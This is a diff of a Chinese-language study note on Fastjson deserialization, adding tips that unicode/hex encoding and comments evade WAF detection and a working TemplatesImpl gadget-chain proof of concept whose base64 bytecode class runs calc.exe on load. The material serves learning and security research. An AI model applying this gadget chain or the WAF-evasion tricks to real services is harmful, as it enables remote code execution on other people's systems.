@@ -386,7 +386,7 @@ parseObject second has done => class org.example.User
 
 ![image-20241219165334952](./images/image-20241219165334952.png)
 
-如果有参，这里是只考虑到了内部类实例化的情况，`else`里的大段代码这里就略过了。**为什么没有考虑有参构造器且不是内部类的情况呢（TODO）**
+如果有参，这里是只考虑到了内部类实例化的情况，`else`里的大段代码这里就略过了。
 
 实例化后，还有一个检查，是否开启了`Feature.InitStringFieldAsEmpty`（默认关闭），如果开启了，就会把刚刚实例化产生的对象的`String`类型的属性设置为空字符串。如果先前已经获取到了对应属性的set方法，将会调用该方法设置，否则通过反射设置。
 
@@ -398,7 +398,7 @@ parseObject second has done => class org.example.User
 
 ![image-20241219172646783](./images/image-20241219172646783.png)
 
-步入`FieldDeserializer#setValue`，如果先前获取到了属性的set方法，且`getOnly`不为true，则会调用set方法；**如果`getOnly`为true，则会调用（TODO）**
+步入`FieldDeserializer#setValue`，如果先前获取到了属性的set方法，且`getOnly`不为true，则会调用set方法；按照之前的分析，一些情况下`getOnly`为true，这些情况加将会调用获取到的get方法
 
 ![image-20241219174835927](./images/image-20241219174835927.png)
 
@@ -414,9 +414,117 @@ parseObject second has done => class org.example.User
 
 ![image-20241220103838478](./images/image-20241220103838478.png)
 
-步入，首先获取到一个反序列化器，这个过程**和之前类似（TODO）**，然后递归调用`javaBeanDeser.deserialze`，在反序列化`"flag{d0g3_learn_java}"`后，再通过`FieldDeserializer#setValue`将属性赋值
+步入，首先获取到一个反序列化器，这个过程和之前类似，然后递归调用`javaBeanDeser.deserialze`，在反序列化`"flag{d0g3_learn_java}"`后，再通过`FieldDeserializer#setValue`将属性赋值
 
 ![image-20241220105920607](./images/image-20241220105920607.png)
 
 ![image-20241220110033058](./images/image-20241220110033058.png)
 
+**分析第二种写法的get调用情况**（TODO）
+
+```java
+System.out.printf("parseObject one has done => %s\n",JSON.parseObject(serJson1).getClass());
+```
+
+从上述代码运行的结果中可以观察到第二种写法和其他两种有些不同，打印的结果中调用了类的`getter`方法，对比后不难发现原因在于
+
+![image-20241230174651185](./images/image-20241230174651185.png)
+
+
+
+#### 总结
+
+* JSON中的键&值均可使⽤unicode编码 & ⼗六进制编码（可⽤于绕过WAF检测） 
+* JSON解析时会忽略双引号外的所有空格、换⾏、注释符（可⽤于绕过WAF检测）
+* 反序列化过程中会调用类的构造器（一般是无参）
+* 反序列化过程中会调用属性相应的set方法
+* 一些满足特点要求的类在反序列化过程中会调用相应属性的get方法
+* 第二种反序列化写法会调用属性的get方法（TODO）
+
+### 几个利用链的补充分析
+
+#### TemplatesImpl
+
+```java
+public class HelloTemplatesImpl {
+    public static void main(String[] args) throws TransformerConfigurationException {
+        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANwoADAAbCQAcAB0IAB4KAB8AIAoAIQAiCAAjCgAhACQHACUHACYKAAkAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAqAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAJQEAClNvdXJjZUZpbGUBABBDYWxjRXhhbXBsZS5qYXZhDAANAA4HACsMACwALQEADENhbGMgRXhhbXBsZQcALgwALwAwBwAxDAAyADMBAAhjYWxjLmV4ZQwANAA1AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAANADYBAAtDYWxjRXhhbXBsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACwAMAAAAAAAEAAEADQAOAAEADwAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABABAAAAAOAAMAAAARAAQAEgAMABMAAQARABIAAgAPAAAAGQAAAAMAAAABsQAAAAEAEAAAAAYAAQAAABgAEwAAAAQAAQAUAAEAEQAVAAIADwAAABkAAAAEAAAAAbEAAAABABAAAAAGAAEAAAAdABMAAAAEAAEAFAAIABYADgABAA8AAABUAAMAAQAAABe4AAUSBrYAB0unAA1LuwAJWSq3AAq/sQABAAAACQAMAAgAAgAQAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFwAAAAcAAkwHABgJAAEAGQAAAAIAGg==");
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][] {code});
+        setFieldValue(obj, "_name", "CalcExample");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        obj.newTransformer();
+    }
+
+    private static void setFieldValue(Object obj, String propertyName, Object value) {
+        try {
+            // 获取对象的类
+            Class<?> clazz = obj.getClass();
+            // 获取指定名称的属性
+            Field field = clazz.getDeclaredField(propertyName);
+            // 设置属性的访问权限
+            field.setAccessible(true);
+            // 设置属性值
+            field.set(obj, value);
+        } catch (NoSuchFieldException | IllegalAccessException e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+加载的类如下，必须继承`AbstractTranslet`
+
+```java
+public class CalcExample extends AbstractTranslet {
+    static{
+        try {
+            Process process = Runtime.getRuntime().exec("calc.exe");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+    }
+    public CalcExample(){
+        System.out.println("Calc Example");
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+```
+
+**利用链流程梳理**
+
+注意TemplatesImpl#defineTransletClasses()和Constructor#newInstance()均在TemplatesImpl#getTransletInstance()中被调用
+
+```txt
+TemplatesImpl#newTransformer()->
+	TemplatesImpl#getTransletInstance()->
+		TemplatesImpl#defineTransletClasses()->
+			TemplatesImpl#getTransletInstance()->
+				TransletClassLoader#defineClass()
+		Constructor#newInstance()
+```
+
+#### JdbcRowSetImpl
+
+### 漏洞历史
+
+#### Fastjson<=1.2.24
+
+### 探测
+
+#### json反序列化库的探测
+
+#### fastjson关键版本探测
+
+### 工具
+
+#### 
